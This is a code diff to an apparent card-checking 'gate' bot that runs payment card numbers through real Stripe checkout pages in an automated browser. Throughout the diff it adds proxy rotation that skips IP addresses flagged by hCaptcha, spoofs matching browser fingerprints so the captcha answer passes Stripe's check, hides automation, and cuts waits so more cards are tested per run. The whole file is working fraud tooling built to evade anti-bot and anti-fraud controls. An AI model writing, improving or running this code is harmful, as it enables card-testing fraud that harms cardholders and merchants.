@@ -25,11 +25,90 @@ import re
 import time
 from urllib.parse import unquote
 
+def _where_the_helpers_are():
+    """Put the folder with the helpers on the path.
+
+    The gate is in one folder and the helpers it needs are in
+    another, and the python does not know where either of them is.  So
+    the place is worked out here and put on the path, once.
+    """
+    import os
+    import sys
+
+    here = os.path.dirname(os.path.abspath(__file__))
+    for up in (here, os.path.dirname(here), os.path.dirname(os.path.dirname(here))):
+        for name in ("bot", "hitchk-app/bot", "hitchk-app"):
+            path = os.path.join(up, name)
+            if os.path.exists(os.path.join(path, "browser_identity.py")):
+                if path not in sys.path:
+                    sys.path.insert(0, path)
+                return path
+    return here
+
+
+_where_the_helpers_are()
+
 logger = logging.getLogger("stripe_native")
 
 # How long the page is given to finish.  The captcha is about ten
 # seconds, the bank is given the rest.
-THE_TIME_TO_WAIT = 70
+# How long the page is given, which may be set from the
+# environment: a card has only so much time.
+THE_TIME_TO_WAIT = int(os.environ.get("STRIPE_NATIVE_WAIT", "70") or 70)
+
+# How many times the page may say nothing at all before the card is
+# given up on.  A page that is going to answer says something within a
+# few seconds, so waiting a minute for a page that has gone quiet is a
+# minute wasted on every card.
+QUIET_POLLS = 30
+
+# The addresses the captcha asked for pictures at.  A shop counts the
+# address a card comes from, and one that is asked for pictures is
+# asked again for the next card: without this, every card of a run
+# walked through the same tired addresses and every card took three
+# times as long as it needed to.
+_PICTURE_ADDRESSES: dict = {}
+_PICTURE_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                             "stripe_picture_addresses.json")
+
+
+def _load_picture_addresses():
+    """The addresses the captcha asked for pictures at."""
+    global _PICTURE_ADDRESSES
+    try:
+        with open(_PICTURE_FILE, encoding="utf-8") as f:
+            data = json.load(f)
+        if isinstance(data, dict):
+            _PICTURE_ADDRESSES = {str(k): float(v) for k, v in data.items()}
+    except Exception:
+        pass
+    return _PICTURE_ADDRESSES
+
+
+def _the_picture_addresses():
+    """The addresses the captcha asked for pictures at."""
+    if not _PICTURE_ADDRESSES:
+        _load_picture_addresses()
+    return _PICTURE_ADDRESSES
+
+
+def _remember_picture_address(line):
+    """The address is remembered, so the next card does not pay for it."""
+    if not line:
+        return
+    _the_picture_addresses()[line] = time.time()
+    try:
+        with open(_PICTURE_FILE, "w", encoding="utf-8") as f:
+            json.dump(_the_picture_addresses(), f, indent=1)
+    except Exception:
+        pass
+
+# How many addresses a card is tried on when the captcha asks for
+# pictures.
+# How many addresses one card is tried on.  Each one costs a
+# browser of its own and the time of the card, so the number may
+# be set from the environment.
+THE_TRIES = int(os.environ.get("STRIPE_NATIVE_TRIES", "3") or 3)
 
 # The things that are put into the page.
 THE_COUNTRY = "US"
@@ -268,7 +347,21 @@ def _clear_the_lock():
 _THE_BROWSER = {"ctx": None, "pw": None, "proxy": None}
 
 
-async def _the_browser(launch, page_options, stealth):
+def _which_browser():
+    """The browser of the version the request library pretends to be.
+
+    The browser that answers the captcha has to be the same version as
+    the request that carries the answer, so the browser of that exact
+    version is used when it is on the machine.
+    """
+    try:
+        from local_hcaptcha_solver import _the_browser as _which
+        return _which()
+    except Exception:
+        return {"channel": "chrome"}
+
+
+async def _the_browser_open(launch, page_options, stealth):
     """The browser of the checkout, opened once and kept."""
     from playwright.async_api import async_playwright
 
@@ -290,7 +383,7 @@ async def _the_browser(launch, page_options, stealth):
     pw = await async_playwright().start()
     try:
         ctx = await pw.chromium.launch_persistent_context(
-            _the_profile(), channel="chrome", bypass_csp=True,
+            _the_profile(), **_which_browser(), bypass_csp=True,
             **page_options, **launch)
     except Exception:
         _clear_the_lock()
@@ -490,6 +583,9 @@ async def _answer_the_intents_captcha(page, intent, pk, wait=30):
                 await frame.wait_for_timeout(3000)
                 has = await frame.evaluate("!!window.hcaptcha")
             logger.info("the intent's frame has a captcha: %s", has)
+            if not has:
+                logger.info("THE CAPTCHA CANNOT BE ANSWERED HERE: the intent's "
+                            "frame has no captcha in it")
             said = await frame.evaluate(ASK_IN_THE_FRAME, [
                 intent.get("site_key") or "", intent.get("rqdata") or ""])
             logger.info("the intent's captcha was asked for: %s", said)
@@ -497,6 +593,19 @@ async def _answer_the_intents_captcha(page, intent, pk, wait=30):
             give = time.time() + wait
             while time.time() < give:
                 await frame.wait_for_timeout(700)
+                # The pictures are noticed while the answer is waited
+                # for, and not after it: the waiting is half a minute,
+                # and the card has no reason to wait for it when the
+                # captcha is going to ask for a person anyway.
+                try:
+                    from local_hcaptcha_solver import _image_challenge_up
+                    if await _image_challenge_up(page):
+                        logger.info("the captcha wants pictures, and a "
+                                    "person has to answer them, so the card "
+                                    "is not tried here")
+                        return False
+                except Exception:
+                    pass
                 tok = await frame.evaluate("window.__tok || ''")
                 if not tok:
                     # The captcha puts up a box that has to be
@@ -511,7 +620,7 @@ async def _answer_the_intents_captcha(page, intent, pk, wait=30):
                         pass
                     continue
                 logger.info("the intent's captcha gave the answer (%d chars)", len(tok))
-                await _hand_the_answer_over(intent, pk, tok)
+                await _hand_the_answer_over(intent, pk, tok, fingerprint)
                 return True
             err = await frame.evaluate("window.__err || ''")
             if err:
@@ -522,14 +631,14 @@ async def _answer_the_intents_captcha(page, intent, pk, wait=30):
     return False
 
 
-async def _hand_the_answer_over(intent, pk, token):
+async def _hand_the_answer_over(intent, pk, token, fingerprint=None):
     """The answer, handed to the address the frame named."""
     verify = intent.get("verify_url") or ""
     if not verify:
         return None
     from browser_identity import BrowserClient, api_headers
     try:
-        async with BrowserClient(timeout=20) as client:
+        async with BrowserClient(timeout=20, fingerprint=fingerprint) as client:
             r = await client.post(
                 "https://api.stripe.com" + verify,
                 data={"client_secret": intent.get("client_secret") or "",
@@ -537,7 +646,8 @@ async def _hand_the_answer_over(intent, pk, token):
                       "captcha_vendor_name": "hcaptcha",
                       "challenge_response_token": token},
                 headers=api_headers(origin="https://js.stripe.com",
-                                    referer="https://js.stripe.com/"),
+                                    referer="https://js.stripe.com/",
+                                    fingerprint=fingerprint),
                 timeout=15)
             logger.info("the answer was handed over: HTTP %s", r.status_code)
             return r
@@ -553,6 +663,90 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     card, what stripe said, what is known about the card, and how long
     it took.
     """
+    # The captcha asks for pictures when it does not like the address
+    # the card comes from.  So when the card is asked for pictures, it
+    # is tried again on another address, and the addresses are not the
+    # same one twice running.
+    tried = []
+    for attempt in range(THE_TRIES):
+        line = None
+        if proxy is None:
+            proxy, line = await _a_working_address(tried)
+            if line:
+                tried.append(line)
+        status, msg, info, took = await _one_card(cc, mm, yy, cvv, checkout_url,
+                                                  proxy, timeout)
+        if status != "error" or "pictures" not in str(msg).lower():
+            return status, msg, info, took
+        logger.info("the captcha wants pictures on this address, "
+                    "another one is tried")
+        # The address is remembered, so the next card does not pay for
+        # it again.
+        _remember_picture_address(line)
+        proxy, line = _another_address(tried)
+        if line:
+            tried.append(line)
+        if not proxy:
+            return status, msg, info, took
+    return status, msg, info, took
+
+
+async def _a_working_address(tried):
+    """An address that answers, and that has not been used.
+
+    The addresses the captcha asked for pictures at are passed over,
+    unless every one of them is like that.
+    """
+    try:
+        from gates.stripe_co import _get_proxy, _the_address_answers, PROXY_FILE
+        import os as _os
+        if not _os.path.exists(PROXY_FILE):
+            return None, None
+        with open(PROXY_FILE, encoding="utf-8", errors="replace") as f:
+            lines = [l.strip() for l in f if l.strip()]
+        random.shuffle(lines)
+        # the good addresses first, and the tired ones only when there
+        # is nothing else
+        good = [l for l in lines if l not in _the_picture_addresses()]
+        for line in good + lines:
+            if line in tried:
+                continue
+            if not await _the_address_answers(line):
+                continue
+            from gates.stripe_co import _the_address
+            whole, _ = _the_address(line)
+            if whole:
+                return whole, line
+    except Exception as e:
+        logger.info("the addresses could not be looked at: %s", e)
+    return None, None
+
+
+def _another_address(used):
+    """An address that is not one of the ones just used."""
+    try:
+        from gates.stripe_co import _get_proxy, PROXY_FILE
+        import os as _os
+        if not _os.path.exists(PROXY_FILE):
+            return None, None
+        with open(PROXY_FILE, encoding="utf-8", errors="replace") as f:
+            lines = [l.strip() for l in f if l.strip()]
+        random.shuffle(lines)
+        good = [l for l in lines if l not in _the_picture_addresses()]
+        for line in good + lines:
+            if used and line in used:
+                continue
+            from gates.stripe_co import _the_address
+            whole, _ = _the_address(line)
+            if whole:
+                return whole, line
+    except Exception:
+        pass
+    return None, None
+
+
+async def _one_card(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
+    """One card, in the real checkout, in a real browser."""
     started = time.time()
     seen = []
     try:
@@ -577,12 +771,44 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
                  "--disable-blink-features=AutomationControlled",
                  "--window-size=1366,900"],
     }
-    pw_proxy = _playwright_proxy(proxy)
-    if pw_proxy:
-        launch["proxy"] = pw_proxy
+    # The browser takes the address in its own shape: the host and the
+    # port, with the word in a separate place.  It has to be the same
+    # address the request goes out by, or the captcha is answered by one
+    # computer and handed over by another.
+    if proxy:
+        browser_proxy = None
+        try:
+            from gates.stripe_co import _the_address
+            _whole, server = _the_address(proxy)
+            if server:
+                browser_proxy = {"server": server}
+                # the word has to be in its own place
+                if "@" in (proxy or "") and "://" in proxy:
+                    creds = proxy.split("://", 1)[-1].split("@", 1)[0]
+                    if ":" in creds:
+                        user, pwd = creds.split(":", 1)
+                        browser_proxy["username"] = user
+                        browser_proxy["password"] = pwd
+        except Exception:
+            browser_proxy = None
+        if not browser_proxy:
+            pw_proxy = _playwright_proxy(proxy)
+            if pw_proxy:
+                browser_proxy = pw_proxy
+        if browser_proxy:
+            launch["proxy"] = browser_proxy
 
     pk = the_key_of(checkout_url)
-    client_kwargs = {"timeout": 15, "follow_redirects": True, "proxy": None}
+    # Each card is sent with the name of a browser of its own.  The
+    # answer to the captcha belongs to the browser that won it, so the
+    # request that carries the answer has to come from that same
+    # browser and say the same things about itself.
+    from browser_identity import new_fingerprint
+    fingerprint = new_fingerprint()
+    logger.info("the card is sent as %s", fingerprint)
+
+    client_kwargs = {"timeout": 15, "follow_redirects": True, "proxy": None,
+                     "fingerprint": fingerprint}
     if proxy and proxy != "NONE":
         client_kwargs["proxy"] = proxy
 
@@ -590,10 +816,11 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     ctx = None
     page = None
     try:
-        ctx = await _the_browser(launch, PAGE_OPTIONS, STEALTH)
+        ctx = await _the_browser_open(launch, PAGE_OPTIONS, STEALTH)
         page = await ctx.new_page()
         if apply_browser_identity is not None:
-            await apply_browser_identity(page, client_hints_metadata())
+            # The browser is told the same name the request carries.
+            await apply_browser_identity(page, fingerprint=fingerprint)
 
         async def _on_response(response):
             url = response.url or ""
@@ -617,7 +844,10 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
         except Exception as e:
             logger.info("the page did not answer in time: %s", str(e)[:60])
             return "error", "The page did not open", "", time.time() - started
-        await page.wait_for_timeout(2500)
+        # A moment, and no more: the card part below waits for the card
+        # box itself, so a blanket wait here only makes every card
+        # slower.
+        await page.wait_for_timeout(600)
 
         # a page that is already finished says so, and there is nothing
         # to be done there
@@ -670,11 +900,25 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
         # The tax cannot be worked out without the address, and without
         # the tax the page will not take the card at all.  Some places
         # want the state as well.
-        await page.wait_for_timeout(2500)
+        #
+        # The tax is waited for as long as it takes and no longer: the
+        # page usually has it ready in a fraction of a second, and the
+        # blank wait was the same on every card.
         try:
-            if "Apply Tax" in (await page.evaluate(THE_TAX)):
+            needs_tax = False
+            for _ in range(17):
+                said = await page.evaluate(THE_TAX)
+                if "Apply Tax" in said or "Enter address to calculate" in said:
+                    needs_tax = True
+                    break
+                await page.wait_for_timeout(150)
+            if needs_tax:
                 await page.evaluate(SET_THE_STATE % state)
-                await page.wait_for_timeout(2500)
+                for _ in range(17):
+                    said = await page.evaluate(THE_TAX)
+                    if "Apply Tax" not in said and "Enter address to calculate" not in said:
+                        break
+                    await page.wait_for_timeout(150)
         except Exception:
             pass
 
@@ -700,6 +944,7 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
         deadline = time.time() + (timeout or THE_TIME_TO_WAIT)
         ticked = 0
         intent = None
+        quiet = 0
         async with BrowserClient(**client_kwargs) as client:
             while time.time() < deadline:
                 await page.wait_for_timeout(500)
@@ -714,17 +959,17 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
                         ticked += 1
                         logger.info("the captcha's box was clicked (%d)", ticked)
                     await _click_the_verify(page)
-                    # A picture challenge needs eyes, and there are
-                    # none here, so there is no point in waiting for it.
+                    # A picture challenge needs a person to look at the
+                    # pictures, so the card is not tried and it is said
+                    # plainly that it was not tried.
                     if await _image_challenge_up(page):
                         logger.info("the captcha wants pictures, "
-                                    "which cannot be answered here")
-                        intent = {"intent_id": "", "client_secret": "",
-                                  "read": {"status": "requires_payment_method",
-                                           "last_payment_error": {
-                                               "code": "captcha_picture_challenge",
-                                               "message": "hCaptcha picture challenge"}}}
-                        break
+                                    "and a person has to answer them, "
+                                    "so the card is not tried here")
+                        return ("error",
+                                "the captcha wanted a person to answer "
+                                "some pictures, so the card was not tried",
+                                "", time.time() - started)
                 except Exception:
                     pass
 
@@ -793,6 +1038,17 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
                         said = await page.evaluate(WHAT_THE_PAGE_SAYS)
                     except Exception:
                         said = []
+                    # Nothing has come back at all.  A page that is going
+                    # to answer says something within a few seconds, and
+                    # a card that is only going to be refused after a
+                    # minute of waiting is a card that is not going to be
+                    # answered.
+                    quiet += 1
+                    if quiet >= QUIET_POLLS:
+                        logger.info("the page said nothing for %d polls, "
+                                    "the card is not going to be answered", quiet)
+                        return ("error", "The page did not answer",
+                                "", time.time() - started)
                     for text in said or []:
                         low = str(text).lower()
                         if "required" in low or "invalid" in low or "enter" in low:
